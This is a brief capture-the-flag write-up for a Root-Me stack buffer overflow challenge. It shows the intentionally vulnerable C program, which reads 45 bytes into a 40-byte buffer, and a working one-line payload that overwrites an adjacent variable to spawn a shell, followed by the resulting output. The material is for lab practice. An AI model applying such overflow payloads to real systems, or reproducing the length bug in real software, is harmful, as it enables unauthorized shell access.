# ELF x86 - Stack buffer overflow basic1

- Problem: https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-1 

We can see the source code as follows.
```
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
int main()
{
  int var;
  int check = 0x04030201;
  char buf[40];
  fgets(buf,45,stdin);
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

The check variable should be 0xdeadbeef. We can overflow buffer by inserting more than 40 bytes.
```
app-systeme-ch13@challenge02:~$ cat <(python -c 'print "A" * 40 + "\xef\xbe\xad\xde"') - | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ▒
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
```
